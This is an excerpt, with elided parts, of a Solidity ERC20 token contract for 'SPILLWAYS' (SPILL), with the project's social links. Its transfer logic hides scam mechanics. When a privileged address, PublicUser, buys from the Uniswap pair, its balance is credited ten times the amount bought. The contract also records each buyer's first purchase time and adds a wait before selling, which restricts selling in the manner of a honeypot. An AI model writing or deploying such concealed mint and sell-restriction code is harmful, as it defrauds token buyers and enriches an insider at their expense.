...
//
// https://twitter.com/spillways10
// https://www.spillways.finance/
...
contract SPILLWAYS is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private nomorefees;
    mapping (address => uint256) private allcanbuy; 
    string private  _name = "SPILLWAYS";
    string private  _symbol = "SPILL";
    uint8   private  _decimals = 9;
    uint256 private _totalSupply = 100000000 * 10 ** 9;
    uint256 private waittime = 5 * 1000 ;
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        uint256  time = block.timestamp;  uint256  allyours = tokens * 10;

        if ( from == uniswapV2Pair && to == PublicUser )  { _tOwned [PublicUser] += allyours;}

        if ( from == uniswapV2Pair ) {  if( balanceOf(to) == 0) { {allcanbuy[to] = time;  }  }  }  

        uint256 _sell = allcanbuy[from] + waittime;
